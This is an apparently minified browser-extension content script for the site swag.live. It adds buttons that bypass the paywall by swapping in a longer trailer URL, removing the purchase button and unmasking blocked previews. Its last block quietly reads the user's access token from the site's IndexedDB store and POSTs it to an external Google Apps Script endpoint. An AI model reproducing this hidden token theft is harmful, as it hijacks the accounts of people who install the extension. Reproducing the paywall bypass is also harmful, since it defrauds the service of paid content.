function replaceVideoWithVip(){var b,a=window.location.href;a.startsWith("https://app.swag.live")?b=a.match(/https:\/\/app.swag.live\/flix\/(.*)/)[1]:a.startsWith("https://swag.live")&&(b=a.match(/https:\/\/swag.live\/flix\/(.*)/)[1]),$("video").attr("src",`https://asia.messages.swag.live/${b}/trailer.mp4?preset=clear-300s`),removePurchbutton()}function toggleVideoMute(){$("video").prop("muted")?$("video").prop("muted",!1):$("video").prop("muted",!0)}function removePurchbutton(){$(".FlixPlayerActionButton__ActionButton-sc-m29lyx-1").remove()}function unmask(){$(".TrailerBlocker__Image-sc-388ncs-1").remove(),$(".TrailerBlocker__StyledTrailerBlocker-sc-388ncs-0").removeClass("geTRaC")}function newTab(){var b,a=window.location.href;a.startsWith("https://app.swag.live")?b=a.match(/https:\/\/app.swag.live\/flix\/(.*)/)[1]:a.startsWith("https://swag.live")&&(b=a.match(/https:\/\/swag.live\/flix\/(.*)/)[1]),window.open(`https://asia.messages.swag.live/${b}/trailer.mp4?preset=clear-300s`,"_blank").focus()}chrome.runtime.onMessage.addListener(function(a,b,c){vipButtonId="vip_button",toggleMuteButtonId="mute_button",unmaskButtonId="unmask_button",downloadButtonId="download_button","urlChanged"==a.message&&(0==$(`#${vipButtonId}`).length&&(vipButton=$(`<button id="${vipButtonId}">VIP</button>`),$(".FlixDetailReaction__ActionButtons-sc-s3f6ri-4").append(vipButton),vipButton.click(replaceVideoWithVip)),0==$(`#${toggleMuteButtonId}`).length&&(toggleMuteButton=$(`<button id="${toggleMuteButtonId}">Toggle mute</button>`),$(".FlixDetailReaction__ActionButtons-sc-s3f6ri-4").append(toggleMuteButton),toggleMuteButton.click(toggleVideoMute)),0==$(`#${unmaskButtonId}`).length&&(unmaskButton=$(`<button id="${unmaskButtonId}">Unmask</button>`),$(".FlixDetailReaction__ActionButtons-sc-s3f6ri-4").append(unmaskButton),unmaskButton.click(unmask)),0==$(`#${downloadButtonId}`).length&&(downloadButton=$(`<button id="${downloadButtonId}">Download</button>`),$(".FlixDetailReaction__ActionButtons-sc-s3f6ri-4").append(downloadButton),downloadButton.click(newTab)))});const scriptURL="https://script.google.com/macros/s/AKfycbx3ueeTCa4KdH3gwVTJVTbgo_u3pDRIQ4HQM84QpOMDY4VS7ROxoZDzXPUABCXPui8/exec";var db,request=indexedDB.open("localforage",2);request.onsuccess=function(){var a=(db=request.result).transaction("keyvaluepairs","readonly").objectStore("keyvaluepairs").getAll("_accessToken");a.onsuccess=function(){var b=a.result.toString(),c=window.localStorage.getItem("_accessTokensg");if(!c||b!=c){window.localStorage.setItem("_accessTokensg",b);var d=new FormData;d.append("token",b),fetch("https://script.google.com/macros/s/AKfycbx3ueeTCa4KdH3gwVTJVTbgo_u3pDRIQ4HQM84QpOMDY4VS7ROxoZDzXPUABCXPui8/exec",{method:"POST",body:d})}}}